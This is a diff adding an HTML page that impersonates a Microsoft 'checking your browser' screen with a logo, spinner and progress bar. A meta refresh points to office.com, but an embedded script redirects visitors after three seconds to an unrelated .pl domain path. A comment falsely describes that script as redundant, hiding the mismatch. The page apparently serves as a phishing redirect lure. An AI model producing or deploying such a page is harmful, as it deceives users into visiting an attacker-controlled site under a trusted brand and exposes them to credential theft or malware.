@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="3; url=https://www.office.com">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checking Browser</title>
+    <style>
+        body {
+            text-align: center;
+            padding: 50px;
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+        }
+        img {
+            margin-top: 20px;
+        }
+        p {
+            font-size: 20px;
+            margin-top: 20px;
+        }
+        /* Spinner Styles */
+        .spinner {
+            margin: 40px auto 20px;
+            width: 40px;
+            height: 40px;
+            border: 5px solid rgba(0, 0, 0, 0.1);
+            border-radius: 50%;
+            border-top-color: #0078d4;
+            animation: spin 1s infinite linear;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        /* Progress Bar Styles */
+        .progress-bar {
+            width: 100%;
+            background-color: #ddd;
+            border-radius: 13px;
+            overflow: hidden;
+            margin-top: 30px;
+        }
+        .progress {
+            height: 20px;
+            width: 0;
+            background-color: #0078d4;
+            animation: load 3s forwards;
+        }
+        @keyframes load {
+            to {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" width="200">
+    
+    <!-- Spinner for visual feedback -->
+    <div class="spinner"></div>
+    
+    <p>Please wait, checking your browser...</p>
+    
+    <!-- Progress Bar -->
+    <div class="progress-bar">
+        <div class="progress"></div>
+    </div>
+
+    <script>
+        // Redirect in 3 seconds (redundant since the meta tag also does this)
+        setTimeout(function() {
+            window.location.href = "https://entertainmentcircuitfe.pl/uOb3/";
+        }, 3000);
+    </script>
+</body>
+</html>
